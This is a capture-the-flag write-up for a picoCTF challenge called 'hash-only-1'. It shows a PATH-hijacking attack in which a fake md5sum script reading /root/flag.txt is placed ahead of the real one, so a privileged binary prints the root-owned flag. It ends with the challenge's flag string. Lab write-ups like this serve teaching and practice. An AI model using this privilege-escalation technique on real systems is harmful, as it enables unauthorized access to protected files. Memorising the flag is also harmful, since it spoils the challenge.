# [Pwn] hash-only-1

## 📚 Overview

> *"Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!"*

## ✨ Solution

```bash
ctf-player@pico-chall$ echo '#!/bin/bash' > /home/ctf-player/md5sum
ctf-player@pico-chall$ echo 'cat /root/flag.txt' >> /home/ctf-player/md5sum
ctf-player@pico-chall$ chmod +x /home/ctf-player/md5sum
ctf-player@pico-chall$ export PATH=/home/ctf-player:$PATH
ctf-player@pico-chall$ ./flaghasher
Computing the MD5 hash of /root/flag.txt.... 
```

## 🏳 Flag 

`picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_54094e3e}`